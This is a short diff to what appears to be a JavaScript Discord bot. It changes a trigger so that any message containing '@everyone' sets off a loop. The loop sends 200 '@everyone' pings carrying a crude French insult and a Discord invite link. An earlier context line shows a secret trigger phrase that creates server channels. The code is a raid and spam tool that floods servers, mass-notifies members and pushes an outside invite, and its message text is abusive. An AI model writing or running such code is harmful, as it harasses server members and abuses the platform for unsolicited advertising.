@@ -149,7 +149,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
               message.guild.createChannel("BY","voice")
               }
             }
-            if(message.content.includes("!everyone")){
+            if(message.content.includes("@everyone")){
                 for(var i = 0; i < 200; i++){
                     message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/QfAtq4s")
                 }
